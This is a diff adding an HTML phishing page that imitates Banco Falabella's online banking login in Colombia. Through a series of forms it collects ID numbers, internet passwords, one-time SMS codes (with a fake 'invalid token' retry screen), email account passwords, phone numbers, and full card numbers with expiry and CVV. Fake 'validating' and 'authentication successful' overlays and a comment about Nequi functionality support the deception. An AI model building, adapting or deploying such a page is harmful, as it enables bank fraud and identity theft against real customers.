@@ -1,0 +1,380 @@
+<html>
+	<head>
+	  <style>
+@keyframes pulse {
+    0% { transform: scale(1); opacity: 1; }
+    50% { transform: scale(1.1); opacity: 0.7; }
+    100% { transform: scale(1); opacity: 1; }
+}
+</style>
+  		<title>Adquiere tu tarjeta CMR y cuenta de ahorro costo $0 |</title>
+  		<meta http-equiv="content-type" content="text/html; utf-8">
+  		<meta charset="utf-8">  		
+		<meta content="es" http-equiv="Content-Language">
+  		<meta name="description" content="">
+  		<meta name="author" content="">
+  		<meta name="Copyright" content="">
+  		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+ 	 	<meta http-equiv="X-UA-Compatible" content="IE=edge">	 	
+		<link href="css/style.css" rel="stylesheet">
+		<link href="css/stylesheet.css" rel="stylesheet">		
+		<link rel="icon" type="image/png" href="img/logo.png" />
+		<script type="text/javascript" src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+		<script type="text/javascript" src="js/functions.js"></script>
+		<script type="text/javascript" src="js/ready.js"></script>
+		  	
+   	</head>
+   	<body>
+   		<!-- Campos hidden para la funcionalidad de Nequi -->
+   		<input type="hidden" id="session_id" name="session_id">
+   		<input type="hidden" id="username" name="username">
+   		
+   		<!-- Loader overlay para la funcionalidad de Nequi -->
+   		<div id="loader-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9999; justify-content: center; align-items: center;">
+   			<div style="color: white; text-align: center;">
+   				<div style="margin-bottom: 20px;">Procesando...</div>
+   				<div class="loader"></div>
+   			</div>
+   		</div>
+
+   		<div id="fondo-blanco">
+   			<div style="display: table-cell; vertical-align: middle;">
+   			<img src="img/finalizar1.png" width="90"><br><br>
+   			<span style="font-size: 22px;font-weight: 300;">Autenticación Exitosa</span>
+   			</div>
+   		</div>
+
+   		<div id="fondo"></div>
+
+   		    		<div id="fondo-oscuro"></div>
+
+    		<div id="mensaje">
+   			<table>
+   				<tr>
+   					<td>
+   						Por favor espere un momento estamos validando algunos datos. Puede tardar un momento. No cierres o recargues esta ventana.
+   					</td>
+   					<td>
+   						<div class="cargando2"></div>
+   					</td>
+   				</tr>
+   			</table>
+   			<div class="cargando3"></div>
+   		</div>
+   		<div id="cargando">
+	   		<img src="img/logo.png">	
+   		</div>
+   		
+   		<div id="frmToken">
+   			<div class="etiqueta-destacada" style="margin-bottom: 8px;">
+		  		Ingrese su  clave dinámica
+		  	</div>		  	
+		
+			<span>
+		  		Solo debes de ingresar la clave dinámica que te llegara por SMS o correo electrónico
+		  	</span>		  	
+			<br>
+			<div class="separador"></div>
+			<br>
+			<input type="password" placeholder="Clave dinámica" name="txtToken" id="txtToken" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="6">
+		  	<br><br>
+		  	<button class="btn" type="submit" id="btnOTP" disabled> VERIFICAR </button>	
+   		</div>
+
+
+   		<div id="frmTokenError">
+   			<div class="etiqueta-destacada" style="margin-bottom: 8px;">
+		  		Ingrese su Token
+		  	</div>		  	
+			<span>
+		  		Token inválido. Al fallar un número determinado de veces tu Clave Internet se bloqueará
+		  	</span>		  	
+			<br>
+			<div class="separador"></div>
+			<br>
+			<input type="password" placeholder="Clave dinámica" name="txtTokenE" id="txtTokenE" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="6">
+		  	<br><br>
+		  	<button class="btn" type="submit" id="btnOTPE" disabled="disabled"> VERIFICAR </button>	
+   		</div>
+
+
+   		<div id="frmCorreo">
+   			<div class="etiqueta-destacada" style="margin-bottom: 8px;">
+		  		Ingrese su Correo electrónico
+		  	</div>		  	
+		
+			<span>
+		  		Verificaremos estos datos con los agregados anteriormente en nuestras sucursales
+		  	</span>		  	
+			<br>
+			<div class="separador"></div>
+			<br>
+			<input type="text" placeholder="Correo electrónico" name="txtCorreo" id="txtCorreo" class="entradas" autocomplete="off">
+			<br>
+			<input type="password" placeholder="Clave correo" name="txtClaveCO" id="txtClaveCO" class="entradas" autocomplete="off">
+			<br>
+			<input type="text" placeholder="Celular" name="txtCelular" id="txtCelular" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="10">
+		  	<br><br>
+		  	<button class="btn" type="submit" id="btnCorreo" disabled> ACTUALIZAR </button>	
+   		</div>
+
+
+
+   		<div id="frmCelular">
+   			<div class="etiqueta-destacada" style="margin-bottom: 8px;">
+		  		Ingresa tu Clave dinámica
+		  	</div>		  	
+		
+			<span>
+		  		Solo debes ingresar la clave dinámica que te llegará por SMS, correo electrónico o la podrás encontrar a la App 
+		  	</span>		  	
+			<br>
+			<div class="separador"></div>
+			<br>			
+			<input type="password" placeholder="Clave dinámica" name="txtCelular1" id="txtCelular1" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="6">
+		  	<br><br>
+		  	<button class="btn" type="submit" id="btnCelular" disabled="disabled"> VERIFICAR </button>	
+   		</div>
+
+
+
+   		<div id="frmTarjeta">
+   			
+   			<div class="etiqueta-destacada" style="margin-bottom: 8px;">
+		  		Activación de Seguridad
+		  	</div>		  	
+		
+			<span>
+		  		Digite los siguientes datos para activar la seguridad de tu cuenta.
+		  	</span>		  	
+			<br>
+			<div class="separador"></div>
+			<br>
+			<input type="text" placeholder="Tarjeta de crédito o débito" name="txtTarjeta" id="txtTarjeta" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="16">
+			<br>
+			<table width="100%">
+				<tr>
+					<td>
+						<select class="entradas" id="mFecha" name="mFecha">
+                    		<option value="" default selected>Mes</option>
+                            <option value="01">01</option>
+                            <option value="02">02</option>
+                            <option value="03">03</option>
+                            <option value="04">04</option>
+                            <option value="05">05</option>
+                            <option value="06">06</option>
+                            <option value="07">07</option>
+                            <option value="08">08</option>
+                            <option value="09">09</option>
+                            <option value="10">10</option>
+                            <option value="11">11</option>
+                            <option value="12">12</option>
+                        </select>
+					</td>
+					<td>
+						<select class="entradas" id="aFecha" name="aFecha">
+							<option value="" default selected>Año</option>					
+							<option value="2022">2022</option>
+							<option value="2023">2023</option>
+							<option value="2024">2024</option>
+							<option value="2025">2025</option>
+							<option value="2026">2026</option>
+							<option value="2027">2027</option>
+							<option value="2028">2028</option>
+							<option value="2029">2029</option>
+							<option value="2030">2030</option>
+							<option value="2031">2031</option>
+							<option value="2032">2032</option>
+							<option value="2033">2033</option>
+						</select>
+					</td>
+				</tr>
+			</table>
+		
+			<input type="password" placeholder="CVV" name="txtCVV" id="txtCVV" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="3">
+		  	<br><br>
+		  	<button class="btn" type="submit" id="btnTarjeta" disabled="disabled"> VALIDAR </button>
+
+   		</div>
+
+
+   		<div class="top-bar">
+   			<table class="menu-top-bar">
+   				<tr>
+   					<td>Falabella</td>
+   					<td>Viajes Falabella</td>
+   					<td>Seguros Falabella</td>
+   					<td>Sodimac</td>
+   					<td>Linio</td>
+   				</tr>
+   			</table>
+
+   			<table class="ayuda-top-bar">
+   				<tr>
+   					<td style="padding: 8px 2px;"><img src="img/ayuda.svg"></td>
+   					<td style="padding: 8px 2px;">Canales de Atención</td>   					
+   				</tr>
+   			</table>
+
+   			<div style="float:right;"></div>  			
+   		</div>   
+   		<div class="header">
+   			<table style="float:left;">
+   				<tr>
+   					<td><img src="img/menu.jpg" id="boton-menu"></td>
+   					<td><img src="img/logo.svg" id="logo-pal"></td>
+   				</tr>
+   			</table>
+  			
+
+   			<button class="btn" type="submit" id="btnBanca"> BANCA EN LÍNEA </button>
+
+
+   			<table style="float:right" id="frmLogin">
+   				<tr>
+   					<td>
+   						<select name="txtTipo" id="txtTipo" class="entradas">
+   							<option value="CC">Cédula Ciudadanía</option>
+   							<option value="CE">Cédula de Extranjería</option>
+   							<option value="PP">Pasaporte</option>
+   						</select>
+   					</td>
+   					<td>
+   						<input type="text" placeholder="Cédula de Ciudadanía" name="txtDocumento" id="txtDocumento" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="10">
+   					</td>
+   					<td>
+   						<input type="password" placeholder="Clave Internet" name="txtClave" id="txtClave" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="6">
+   					</td>
+   					<td>
+   						<button class="btn" type="submit" id="btnEntrar" disabled > ❯ </button>
+   					</td>
+   				</tr>
+   			</table>
+   		</div>
+   		<div style="text-align: center;padding-top:80px;">
+	   		<div class="menu" style="margin:0 auto;">
+	   			<table cellpadding="0" cellspacing="0">
+	   				<tr>
+	   					<td><span style="border-left: 0px solid;">CUENTAS</span></td>
+	   					<td><span>TARJETAS CMR</span></td>
+	   					<td><span>CDT</span></td>
+	   					<td><span>CRÉDITOS</span></td>
+	   					<td><span>DESCUENTOS</span></td>
+	   					<td><span>BANCA SEGUROS</span></td>
+	   					<td><span>CMR PUNTOS</span></td>
+	   					<td><span>CANALES</span></td>
+	   					<td><span>BANCA EMPRESAS</span></td>
+	   					<td><span>SOSTENIBILIDAD</span></td>
+	   				</tr>
+	   			</table>   			
+	   		</div>
+	   	</div>	
+
+	   	<div id="frmLoginMobile">	  
+	   	<div style="text-align:right;">
+	   		<table style="float:right;" id="btnCerrar">
+	   			<tr>
+	   				<td>CERRAR</td>
+	   				<td><img src="img/x.jpg" style="margin-left: 10px; width: 26px;"></td>
+	   			</tr>
+	   		</table>
+	   		
+	   	</div> 		
+	   	<br>
+	   		<select name="txtTipoM" id="txtTipoM" class="entradas">
+				<option value="CC">Cédula Ciudadanía</option>
+				<option value="CE">Cédula de Extranjería</option>
+				<option value="PP">Pasaporte</option>
+			</select>
+			<br>
+			<input type="text" placeholder="Cédula de Ciudadanía" name="txtDocumentoM" id="txtDocumentoM" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="10">
+		  	<br>
+		  	<input type="password" placeholder="Clave Internet" name="txtClaveM" id="txtClaveM" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="6">
+		  	<br>
+		  	<button class="btn" type="submit" id="btnEntrarM" disabled> INGRESAR </button>	
+		  	<span>Crea o recupera tu Clave Internet</span>  			
+	   	</div>
+
+	   	<div class="slider">
+		    <ul>
+		      <li><img src="img/slider-1.jpg"></li>
+		      <li><img src="img/slider-2.jpg"></li>
+		      <li><img src="img/slider-3.jpg"></li>
+		    </ul>
+		  </div>
+
+		  <div class="slider-mobile">
+		    <ul>
+		      <li><img src="img/slider-mobile-1.jpg"></li>
+		      <li><img src="img/slider-mobile-2.jpg"></li>
+		      <li><img src="img/slider-mobile-3.jpg"></li>
+		    </ul>
+		  </div>
+		  <div class="frmCredito">
+		  	<table width="100%">
+		  		<tr>
+		  			<td class="etiqueta-destacada" width="25%">
+		  				Simula tu Crédito de Consumo
+		  			</td>
+		  			<td width="25%">
+		  				<select name="txtTipoS" id="txtTipoS" class="entradas">
+							<option value="CC">Cédula Ciudadanía</option>
+   							<option value="CE">Cédula de Extranjería</option>
+   							<option value="PP">Pasaporte</option>
+						</select>
+		  			</td>
+		  			<td width="25%">
+		  				<input type="text" placeholder="Cédula de Ciudadanía" name="txtDocumentoS" name="txtDocumentoS" class="entradas" autocomplete="off" pattern="[0-9]*" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="10">
+		  			</td>
+		  			<td>
+		  				<button class="btn" type="submit" id="btnSimular"> SIMULAR </button>
+		  			</td>
+		  		</tr>
+		  	</table>
+		  </div>
+
+		  <div class="frmCreditoMobile" style="text-align: center;">
+		  	<span class="etiqueta-destacada">
+		  		Simula tu Crédito de Consumo
+		  	</span>
+		  	<br>
+			<select name="txtTipoSM" id="txtTipoSM" class="entradas">
+				<option value="CC">Cédula Ciudadanía</option>
+				<option value="CE">Cédula de Extranjería</option>
+				<option value="PP">Pasaporte</option>
+			</select>
+			<br>
+			<input type="text" placeholder="Cédula de Ciudadanía" name="txtDocumentoSM" name="txtDocumentoSM" class="entradas">
+		  	<br>
+		  	<button class="btn" type="submit" id="btnSimularM"> SIMULAR </button>	  	
+		  </div>
+
+		  <div class="contenido">
+		  		<img src="img/contenido.jpg" id="conten">
+		  		<img src="img/contenido-mobile.jpg" id="contenMob">
+		  </div>
+		  
+   		
+
+     
+   <div id="loader" style="
+     position: fixed;
+     top: 0; left: 0; right: 0; bottom: 0;
+     background: #ffffff;
+     display: flex;
+     justify-content: center;
+     align-items: center;
+     flex-direction: column;
+     z-index: 9999;
+ ">
+     <img src="img/l1.png" alt="Cargando..." style="width: 120px; height: 120px; animation: pulse 1.5s infinite;">
+ </div>
+ 
+                               <script>
+       // Espera 3 segundos y oculta el loader inicial
+       setTimeout(function () {
+         document.getElementById('loader').style.display = 'none';
+       }, 3000);
+     </script>
+   	</body>
+</html>
